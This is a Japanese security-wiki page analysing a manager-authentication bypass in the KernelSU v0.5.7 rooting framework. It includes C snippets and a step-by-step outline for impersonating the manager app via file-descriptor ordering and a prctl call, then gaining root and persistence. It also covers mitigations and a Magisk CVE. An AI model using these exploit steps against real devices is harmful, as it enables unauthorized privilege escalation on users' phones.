# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

KernelSU、APatch、SKRootなどのRooting Frameworkは、Android/Linux kernelにpatchまたはhookを適用し、非特権userspaceのmanager appに特権機能を公開します。Magiskについては、CVE-2024-48336がKernelSUのsyscall pathではなくmanager側のcode loadingに関係していたため、以下で別途説明します。<sup>[[1]](#references)[[5]](#references)[[13]](#references)</sup>

このページでは、公開 research（特にZimperiumによるKernelSU v0.5.7の分析）で明らかになったtechniqueとpitfallを抽象化し、red teamとblue teamの双方がattack surface、exploitation primitive、堅牢なmitigationを理解できるようにします。<sup>[[1]](#references)</sup>

---
## Architecture pattern: syscall-hooked manager channel

- KernelSU v0.5.7では、kernel hookが`prctl`上でuserspaceからmagic value、command ID、command固有のargumentを受け取ります。<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
- callerはまず`CMD_BECOME_MANAGER`でmanager statusを要求します。Authorizationはcommandごとに異なり、`CMD_GRANT_ROOT`はmanager/allowlist stateを確認し、`CMD_ALLOW_SU`はmanager限定、`CMD_SET_SEPOLICY`はこのversionではroot限定です。<sup>[[2]](#references)[[11]](#references)</sup>
- その他のcommandはversion/configurationをqueryするか、framework eventをreportします。<sup>[[2]](#references)</sup>
- どのappでもこのsyscall interfaceをinvokeできるため、manager authenticationの正確性がcriticalです。<sup>[[1]](#references)[[2]](#references)</sup>

Example (KernelSU design):
- Hooked syscall: prctl
- KernelSU handlerへredirectするためのmagic value: 0xDEADBEEF
- Commands include: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT, etc.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

---
## KernelSU v0.5.7 authentication flow (as implemented)

userspaceがprctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...)をcallすると、KernelSUは以下をverifyします。<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

1) Path prefix check
- 提供されたpathは、caller UIDに対応する想定prefixで始まる必要があります。例: /data/data/<pkg> または /data/user/<id>/<pkg>。
- Reference: core_hook.c (v0.5.7) path prefix logic.<sup>[[2]](#references)</sup>

2) Ownership check
- pathはcaller UIDが所有している必要があります。
- Reference: core_hook.c (v0.5.7) ownership logic.<sup>[[2]](#references)</sup>

3) APK signature check via FD table scan
- calling processのopen file descriptorを、descriptor orderの昇順でiterateします。
- 各regular fileについて、pathが`/data/app/`で始まり`/base.apk`で終わる場合、pathに提供されたdata-directory pathからderivedしたpackage substringが含まれていることを要求します。
- これらのpath checkをpassした最初のcandidateのsignatureをverifyします。
- APK v2 signatureをparseし、official manager certificateに対してverifyします。
- References: manager.c (iterating FDs), apk_sign.c (APK v2 verification).<sup>[[3]](#references)[[4]](#references)</sup>

すべてのcheckにpassすると、kernelはmanagerのUIDを一時的にcacheします。manager-only commandは以降そのUIDを受け入れますが、その他のcommandでは各自のUIDまたはallowlist checkが維持されます。<sup>[[2]](#references)[[3]](#references)</sup>

---
## Vulnerability class: trusting path-derived APK selection

KernelSU v0.5.7は、signature resultをPackageManagerのinstalled package identityにbindしていません。`manager.c`では、package testはpath substring check（`strstr(cwd, pkg)`）にすぎず、そのcheckをpassした最初のcandidateがsignature-checkされます。そのためattackerは、正規manager APKをattackerのpackage nameも含む`/data/app/` path下に配置し、それが最初にselectされるようにできます。<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>

このtrust-by-indirectionにより、非特権appはmanagerのsigning keyを所有せずにmanagerをimpersonateできます。<sup>[[1]](#references)</sup>

Exploitedされる主なproperty:<sup>[[1]](#references)[[3]](#references)</sup>
- FD scanはdescriptor index順で実行され、package checkはverified package-to-APK identity bindingではなくpath substring testです。
- open()は利用可能な最小のFDを返します。attackerは先に小さい番号のFDをcloseすることで、orderingをcontrolできます。
- bundled manager APKは、official manager signatureを維持したまま、attackerのpackage stringを含む`/data/app/` path下に配置できます。

---
## Attack preconditions

具体的なKernelSU v0.5.7 caseには以下が必要です。<sup>[[1]](#references)[[3]](#references)</sup>

- deviceがすでにvulnerableなRooting Framework（例: KernelSU v0.5.7）でroot化されている。
- attackerがlocalで任意の非特権code（Android app process）を実行できる。
- v0.5.7 implementationでは、`current->real_parent`のUIDが0である必要があります（source commentではzygote direct-child requirementと説明されています）。`manager.c`はそれ以外のparentをrejectします。<sup>[[3]](#references)</sup>
- real managerがまだauthenticateしていない（例: reboot直後）。一部のframeworkはsuccess後にmanager UIDをcacheするため、raceに勝つ必要があります。<sup>[[1]](#references)</sup>

---
## Exploitation outline (KernelSU v0.5.7)

High-level step（引用されたdemo videoでは、公開proof of conceptの動作が示されています）:<sup>[[1]](#references)[[2]](#references)[[10]](#references)</sup>
1) prefixとownership checkを満たすため、自分のapp data directoryへの有効なpathを構築する。
2) genuineなKernelSU Manager base.apkを、自分のpackage stringを含む`/data/app/` path下に配置し、自分のbase.apkより小さい番号のFDでopenする。
3) prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...)をinvokeしてcheckをpassする。
4) `CMD_GRANT_ROOT`を使用し、その後persistent suのために`CMD_ALLOW_SU`を使用する。root取得後、かつ対応している場合に限り、root-onlyの`CMD_SET_SEPOLICY`をinvokeする。

Step 2（FD ordering）に関するPractical notes:<sup>[[1]](#references)</sup>
- /proc/self/fd symlinkをwalkして、自分の`/data/app/*/base.apk`に対応するprocess FDを特定する。
- 低いFD（例: stdin、fd 0）をcloseし、legitimate manager APKを先にopenしてfd 0（または自分のbase.apk fdより低いindex）を占有させる。
- legitimate manager APKをappにbundleし、そのpathが`/data/app/`で始まり、`/base.apk`で終わり、自分のpackage stringを含むようにする。例えば、appの`lib` directory下のpathでこれらのcheckを満たせます。<sup>[[1]](#references)[[3]](#references)</sup>

Example code snippets (Android/Linux, illustrative only):

open FDをenumerateしてbase.apk entryを探す:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
低い番号のFDが正規のmanager APKを指すように強制する：
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
KernelSU v0.5.7 の `prctl` hook による Manager authentication:<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 1  // KernelSU v0.5.7; other frameworks differ

int become_manager(const char *my_data_dir) {
uint32_t reply = 0;
// arg3: data path; arg4: unused; arg5: userspace result pointer
(void)prctl(KSU_MAGIC, CMD_BECOME_MANAGER,
(unsigned long)my_data_dir, 0UL,
(unsigned long)&reply);
return reply == KSU_MAGIC ? 0 : -1;
}
```
成功後に実行可能な privileged commands（例）:<sup>[[2]](#references)[[11]](#references)</sup>
- CMD_GRANT_ROOT: 現在のプロセスを root に昇格
- CMD_ALLOW_SU: 永続的な su 用の allowlist に自身の package/UID を追加
- CMD_SET_SEPOLICY: root 取得後に SELinux policy を調整；KernelSU v0.5.7 はこの command で UID 0 をチェックする。<sup>[[2]](#references)</sup>

Race/persistence のヒント:
- AndroidManifest で BOOT_COMPLETED receiver（`RECEIVE_BOOT_COMPLETED`）を登録し、reboot 後に起動して正規の manager より先に authentication を試行する。この permission は `ACTION_BOOT_COMPLETED` の受信を許可するが、それ自体が scheduling priority を保証するわけではない。<sup>[[1]](#references)[[12]](#references)</sup>

---
## Detection and mitigation guidance

framework 開発者向け:
- authentication を任意の FD ではなく、caller の package/UID に紐付ける:
- caller の package を UID から解決し、FD をスキャンするのではなく、PackageManager 経由で installed package の signature と照合する。
- kernel-only の場合は、安定した caller identity（task creds）を使用し、process FD ではなく、init/userspace helper が管理する信頼できる source of truth に対して検証する。
- identity として path-prefix checks を使用しない。caller によって容易に満たされるためである。
- channel 上で nonce-based challenge–response を使用し、boot 時または重要な event 発生時に cached manager identity を消去する。
- 可能であれば、generic syscalls を流用するのではなく、binder-based authenticated IPC の使用を検討する。

defenders/blue team 向け:
- rooting frameworks と manager processes の存在を検出する。kernel telemetry がある場合は、疑わしい magic constants（例: 0xDEADBEEF）を伴う prctl calls を監視する。<sup>[[1]](#references)[[11]](#references)</sup>
- managed fleets では、untrusted packages からの boot receivers が boot 後すぐに privileged manager commands を繰り返し試行する場合に、block または alert を行う。
- devices が patched framework versions に更新されていることを確認し、update 時に cached manager IDs を無効化する。

attack の制限:<sup>[[1]](#references)[[2]](#references)</sup>
- 既に vulnerable framework によって rooted されている devices のみに影響する。
- 通常、正規の manager が authentication する前に reboot/race window が必要となる（frameworks によっては reset まで manager UID が cache される）。

---
## Related notes across frameworks

- Password-based auth（例: 過去の APatch/SKRoot builds）は、password が推測または brute-force 可能である場合や、validation に bug がある場合、weak になり得る。<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- Package/signature-based auth（例: KernelSU）は原理上より強固だが、FD scans を通じて選択された path-derived artefacts ではなく、実際の caller に紐付ける必要がある。<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- Magisk: CVE-2024-48336 は、未検証の GMS package から code を load していた Canary 27007 より前の builds に影響し、local app が Magisk app 内で code を実行し、user interaction なしで root に escalate することを可能にした。<sup>[[8]](#references)[[9]](#references)[[13]](#references)</sup>

---
## References

- [1] [Zimperium – すべての悪の Rooting: Mobile Device を compromise し得る Security Holes](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [2] [KernelSU v0.5.7 – core_hook.c の authentication checks](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L149-L205)
- [3] [KernelSU v0.5.7 – manager.c の FD iteration、package check、signature call](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L16-L67)
- [4] [KernelSU v0.5.7 – apk_sign.c の APK v2 verification](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/apk_sign.c#L6-L119)
- [5] [KernelSU project](https://kernelsu.org/)
- [6] [APatch](https://github.com/bmax121/APatch)
- [7] [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [8] [Magisk issue #8279 – GMS が system app であることの Verify](https://github.com/topjohnwu/Magisk/issues/8279)
- [9] [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [10] [KSU PoC demo video (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)
- [11] [KernelSU v0.5.7 – ksu.h の command identifiers](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/ksu.h#L12-L24)
- [12] [Android Manifest.permission.RECEIVE_BOOT_COMPLETED](https://developer.android.com/reference/android/Manifest.permission#RECEIVE_BOOT_COMPLETED)
- [13] [NVD – CVE-2024-48336](https://nvd.nist.gov/vuln/detail/CVE-2024-48336)
{{#include ../../banners/hacktricks-training.md}}
